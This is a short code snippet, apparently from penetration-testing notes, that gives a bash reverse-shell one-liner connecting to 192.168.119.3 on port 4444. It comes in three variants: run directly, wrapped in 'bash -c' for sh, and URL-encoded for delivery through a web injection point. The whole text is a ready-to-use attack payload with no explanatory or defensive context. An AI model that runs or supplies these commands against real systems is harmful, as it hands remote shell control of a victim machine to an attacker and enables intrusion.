
```powershell

# 1: If the executing system executes the command in Bash directly:
bash -i >& /dev/tcp/192.168.119.3/4444 0>&1

# 2. If the system executes the command in Bourne Shell (sh), add bash -c to run it in bash:
bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"

# 3. If encoding is needed:
# use urlencode tool: urlencode "string"
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22


```